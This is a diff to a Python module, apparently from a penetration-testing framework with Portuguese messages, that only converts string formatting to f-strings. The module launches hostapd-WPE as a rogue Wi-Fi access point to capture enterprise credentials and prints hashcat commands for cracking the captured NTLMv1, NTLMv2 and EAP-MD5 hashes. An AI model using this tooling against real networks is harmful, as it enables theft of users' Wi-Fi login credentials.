@@ -126,10 +126,10 @@ class Exploit(Exploit):
         try:
             with open(cfg_path, "w", encoding="utf-8") as fh:
                 fh.write(content)
-            print_info("Config gerada em: {}".format(cfg_path))
+            print_info(f"Config gerada em: {cfg_path}")
             return cfg_path
         except OSError as exc:
-            print_error("Não foi possível escrever config: {}".format(exc))
+            print_error(f"Não foi possível escrever config: {exc}")
             return None
 
     def _crack_hint(self) -> None:
@@ -138,15 +138,15 @@ class Exploit(Exploit):
         print_status("Hashcat hints para credenciais capturadas pelo WPE:")
         print_info(
             "NTLMv1 (EAP-LEAP / MSCHAPv1):\n"
-            "  hashcat -m 5500 {} /path/to/wordlist.txt".format(log)
+            f"  hashcat -m 5500 {log} /path/to/wordlist.txt"
         )
         print_info(
             "NTLMv2 (PEAP/MSCHAPv2):\n"
-            "  hashcat -m 5600 {} /path/to/wordlist.txt".format(log)
+            f"  hashcat -m 5600 {log} /path/to/wordlist.txt"
         )
         print_info(
             "EAP-MD5 (cleartext após intercepção MITM):\n"
-            "  hashcat -m 4800 {} /path/to/wordlist.txt".format(log)
+            f"  hashcat -m 4800 {log} /path/to/wordlist.txt"
         )
         print_info("Formato do log WPE: username:challenge:response (NTLMv1) ou U:username:S:challenge:R:response")
 
@@ -203,7 +203,7 @@ class Exploit(Exploit):
                 return
 
         if not os.path.isfile(cfg):
-            print_error("Config não encontrada: {}".format(cfg))
+            print_error(f"Config não encontrada: {cfg}")
             return
 
         cmd: List[str] = [hostapd_wpe]
@@ -213,14 +213,12 @@ class Exploit(Exploit):
 
         cmd_str = " ".join(cmd)
         if self.dry_run:
-            print_info("DRY RUN — {}".format(cmd_str))
+            print_info(f"DRY RUN — {cmd_str}")
             return
 
-        print_status("Iniciando hostapd-WPE (SSID={}, iface={}, canal={})".format(
-            str(self.ssid).strip(), str(self.interface).strip(), int(self.channel)
-        ))
-        print_info("Log de credenciais: {}".format(str(self.log_file).strip()))
-        print_info("Comando: {}".format(cmd_str))
+        print_status(f"Iniciando hostapd-WPE (SSID={str(self.ssid).strip()}, iface={str(self.interface).strip()}, canal={int(self.channel)})")
+        print_info(f"Log de credenciais: {str(self.log_file).strip()}")
+        print_info(f"Comando: {cmd_str}")
         print_info("Pressione Ctrl+C para parar.")
 
         timeout = int(self.timeout) if int(self.timeout) > 0 else None
@@ -229,11 +227,11 @@ class Exploit(Exploit):
         except KeyboardInterrupt:
             print_info("\nAP encerrado pelo usuário.")
         except subprocess.TimeoutExpired:
-            print_info("Timeout ({:d}s) atingido.".format(int(self.timeout)))
+            print_info(f"Timeout ({int(self.timeout):d}s) atingido.")
         except PermissionError:
             print_error("Permissão negada. Execute com sudo/root.")
         except Exception as exc:
-            print_error("Erro ao executar hostapd-wpe: {}".format(exc))
+            print_error(f"Erro ao executar hostapd-wpe: {exc}")
 
-        print_info("\nVerifique credenciais capturadas em: {}".format(str(self.log_file).strip()))
+        print_info(f"\nVerifique credenciais capturadas em: {str(self.log_file).strip()}")
         self._crack_hint()
